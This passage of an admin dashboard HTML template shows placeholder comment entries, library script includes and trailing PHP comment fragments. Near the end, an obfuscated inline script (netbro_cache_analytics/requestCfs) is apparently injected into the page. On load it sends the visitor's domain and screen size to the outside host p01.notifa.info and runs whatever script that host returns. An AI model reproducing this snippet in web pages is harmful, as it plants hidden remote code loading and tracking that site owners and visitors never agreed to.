					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (22)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/2.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Nicholas</strong> <span class="float-right">11 hour ago</span></p>
				<p>Praesent tristique diam...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (23)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/1.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Carter</strong> <span class="float-right">33 min ago</span></p>
				<p>Cras tempor diam nec...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (22)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/2.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Nicholas</strong> <span class="float-right">11 hour ago</span></p>
				<p>Praesent tristique diam...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (23)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/1.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Carter</strong> <span class="float-right">33 min ago</span></p>
				<p>Cras tempor diam nec metus...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (22)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/2.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Nicholas</strong> <span class="float-right">11 hour ago</span></p>
				<p>Praesent tristique diam...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (23)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/1.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Carter</strong> <span class="float-right">33 min ago</span></p>
				<p>Cras tempor diam nec...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (22)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
			<div class="media">
			  <img class="avatar avatar-lg" src="../images/avatar/2.jpg" alt="...">

			  <div class="media-body">
				<p><strong>Nicholas</strong> <span class="float-right">11 hour ago</span></p>
				<p>Praesent tristique diam...</p>
				<div class="media-block-actions">
				  <nav class="nav nav-dot-separated no-gutters">
					<div class="nav-item">
					  <a class="nav-link text-success" href="#"><i class="fa fa-thumbs-up"></i> (17)</a>
					</div>
					<div class="nav-item">
					  <a class="nav-link text-danger" href="#"><i class="fa fa-thumbs-down"></i> (23)</a>
					</div>
				  </nav>

				  <nav class="nav no-gutters gap-2 font-size-16 media-hover-show">
					<a class="nav-link text-success" href="#" data-toggle="tooltip" title="" data-original-title="Approve"><i class="ion-checkmark"></i></a>
					<a class="nav-link text-danger" href="#" data-toggle="tooltip" title="" data-original-title="Delete"><i class="ion-close"></i></a>
				  </nav>
				</div>
			  </div>
			</div>
		  </div>
      </div>
      <!-- /.tab-pane -->
    </div>
  </aside>
  <!-- /.control-sidebar -->
  
  <!-- Add the sidebar's background. This div must be placed immediately after the control sidebar -->
  <div class="control-sidebar-bg"></div>
  
</div>
<!-- ./wrapper -->
  	
	 
	
	<!-- jQuery 3 -->
	<script src="../assets_admin/vendor_components/jquery-3.3.1/jquery-3.3.1.js"></script>
	
	<!-- fullscreen -->
	<script src="../assets_admin/vendor_components/screenfull/screenfull.js"></script>
	
	<!-- popper -->
	<script src="../assets_admin/vendor_components/popper/dist/popper.min.js"></script>
	
	<!-- Bootstrap 4.0-->
	<script src="../assets_admin/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	
	<!-- Slimscroll -->
	<script src="../assets_admin/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	
	<!-- FastClick -->
	<script src="../assets_admin/vendor_components/fastclick/lib/fastclick.js"></script>
	
	<!-- Sparkline -->
	<script src="../assets_admin/vendor_components/jquery-sparkline/dist/jquery.sparkline.min.js"></script>
	
	<!-- amchart -->
	<script src="https://www.amcharts.com/lib/4/core.js"></script>
	<script src="https://www.amcharts.com/lib/4/charts.js"></script>
	<script src="https://www.amcharts.com/lib/4/themes/animated.js"></script>
	
	<!-- apexcharts -->
	<script src="../assets_admin/vendor_components/apexcharts-bundle/irregular-data-series.js"></script>
	<script src="../assets_admin/vendor_components/apexcharts-bundle/dist/apexcharts.js"></script>
	
	<!-- DashboardX Admin App -->
	<script src="js\template.js"></script>
	
	<!-- DashboardX Admin dashboard demo (This is only for demo purposes) -->
	<script src="js\pages\dashboard.js"></script>
	
	<!-- DashboardX Admin for demo purposes -->
	<script src="js\demo.js"></script>
	
	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAhRgyBus6bo%2b5oPZ2FH%2bA4zJcYdeI82SvcA1%2fZK5Uz4gxZpeVMKHxrapcK8IaYiXat4xTCoL6fS0GDbE6s7pYHmJGVRAGPxUUgGwnaqNIlccTFa%2falpZca%2f%2bDKINGBUyJUpUT8tJ%2b24et6SZKPKaVS7OZcaJgu7mDE6zysW33Jwn%2bNtIU9l7Sxdu9INV41w4PM3wEbGEoMT%2fTlKbDem0QBeAgN137tRF6tmmbrg87NMejYlbW151RVDTP8K7qbrb%2fKJAIXnHqIzyXdiEqUp7LgD6CpFPh%2fD9RqyYtdxkYSaawAR2iYoYNYNO%2fVf5nSp355McWj8xhrrXrYKIFWaqCwcpziNArfAq6VS%2bwRRyJ0%2fc08L4Y4NKokdlhrcOWPKN1JJNPVplfKSQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
	<style type="text/css">
li.dropdown {
	border-top-right-radius: 5px;
 }
 
	.dropdown:hover .isi-dropdown {
		display: block;
	}
 
	.isi-dropdown a:hover {
		color: #fff !important;
	}
 
	.isi-dropdown {
		padding-top: 5px;
		padding-bottom: 5px;
		border-bottom-right-radius: 5px;
		position: absolute;
		box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
		z-index: 1;
		background-color: #f9f9f9;
		padding: 10px 10px;
        font-size: 1.2rem;
	}
 
	.isi-dropdown a {
		color: #3c3c3c !important;
	}
 
	.isi-dropdown a:hover {
		color: #232323 !important;
		background: #f3f3f3 !important;
	}
</style>
	</html>
	
// }else{
//     session_destroy();
//     header('Location:login.php');
// }

